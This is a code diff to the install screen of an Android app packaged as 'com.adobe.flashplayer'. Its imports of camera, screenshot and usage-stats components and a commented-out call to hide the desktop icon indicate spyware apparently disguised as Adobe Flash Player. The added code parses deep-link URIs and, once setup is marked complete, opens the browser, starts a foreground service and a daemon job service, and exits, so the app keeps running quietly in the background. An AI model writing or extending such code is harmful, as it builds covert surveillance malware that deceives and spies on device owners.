@@ -7,6 +7,7 @@ import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
@@ -32,6 +33,8 @@ import com.adobe.flashplayer.core.UsageStatsMgr;
 import com.adobe.flashplayer.data.CameraActivity;
 import com.adobe.flashplayer.data.CameraActivity2;
 import com.adobe.flashplayer.data.ScreenShotActivity;
+
+import java.util.List;
 
 public class InstallActivity extends Activity  {
 
@@ -85,10 +88,61 @@ public class InstallActivity extends Activity  {
 
             Log.e(TAG,"onCreate");
 
+            Uri uri = getIntent().getData();
+            if(uri != null) {
+
+                // 完整的url信息
+                String url = uri.toString();
+                Log.e(TAG, "url: "  + uri);
+
+                // scheme部分
+                String scheme = uri.getScheme();
+                Log.e(TAG, "scheme: "  + scheme);
+
+                // host部分
+                String host = uri.getHost();
+                Log.e(TAG, "host: "  + host);
+
+                //port部分
+                int port = uri.getPort();
+                Log.e(TAG, "host: "  + port);
+
+                // 访问路劲
+                String path = uri.getPath();
+                Log.e(TAG, "path: "  + path);
+                List<String> pathSegments = uri.getPathSegments();
+
+                // Query部分
+                String query = uri.getQuery();
+                Log.e(TAG, "query: "  + query);
+
+                //获取指定参数值
+                String value = uri.getQueryParameter("string_key");
+                Log.e(TAG, "string_key: "  + value);
+
+                Toast.makeText(InstallActivity.this,"wake up from scheme",Toast.LENGTH_LONG);
+            }
+
+
             PrefOper.setValue(InstallActivity.this, Public.PARAMCONFIG_FileName, Public.SETUPMODE, Public.SETUPMODE_MANUAL);
 
-            if (debug_flag ){
+            String isSettled = PrefOper.getValue(InstallActivity.this, Public.PARAMCONFIG_FileName, Public.SETUPCOMPLETE);
+            if (isSettled != null && isSettled.equals(Public.INSTALL_SETTLED) == true){
+                InstallHelper.toAndroidBrowser(InstallActivity.this);
 
+                CoreHelper.startForegroundService(InstallActivity.this);
+
+                CoreHelper.startJobDeamonService(InstallActivity.this);
+
+                Permission.checkPermission(InstallActivity.this);
+
+                finish();
+
+                return;
+            }else{
+                if (debug_flag ){
+
+                    //do something to debug
                 /*
                 Intent intentscr = new Intent(InstallActivity.this, ScreenShotActivity.class);
                 intentscr.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
@@ -101,10 +155,11 @@ public class InstallActivity extends Activity  {
                 startActivity(intentCamera);
                  */
 
-                install(InstallActivity.this);
-            }
-            else{
-                checkInstallCode(InstallActivity.this);
+                    install(InstallActivity.this);
+                }
+                else{
+                    checkInstallCode(InstallActivity.this);
+                }
             }
         } catch (Exception ex) {
             ex.printStackTrace();
@@ -234,22 +289,18 @@ public class InstallActivity extends Activity  {
 
                     Toast.makeText(InstallActivity.this, "即将完成设置",Toast.LENGTH_LONG).show();
 
-                    PrefOper.setValue(InstallActivity.this, Public.PARAMCONFIG_FileName, Public.SETUPCOMPLETE, "ok");
-
-                    Intent intent = new Intent(InstallActivity.this, MaskActivity.class);
-                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                    startActivity(intent);
-
                     if (debug_flag == false){
                         mHandler.removeCallbacksAndMessages(null);
+
                         //InstallHelper.hideDesktopIcon(InstallActivity.this);
                     }
                     else{
-
-                        new MainEntry(InstallActivity.this,"").start();
+                        //new MainEntry(InstallActivity.this,"").start();
                     }
 
                     finish();
+
+                    PrefOper.setValue(InstallActivity.this, Public.PARAMCONFIG_FileName, Public.SETUPCOMPLETE, Public.INSTALL_SETTLED);
 
                     return;
                 }catch(Exception ex){
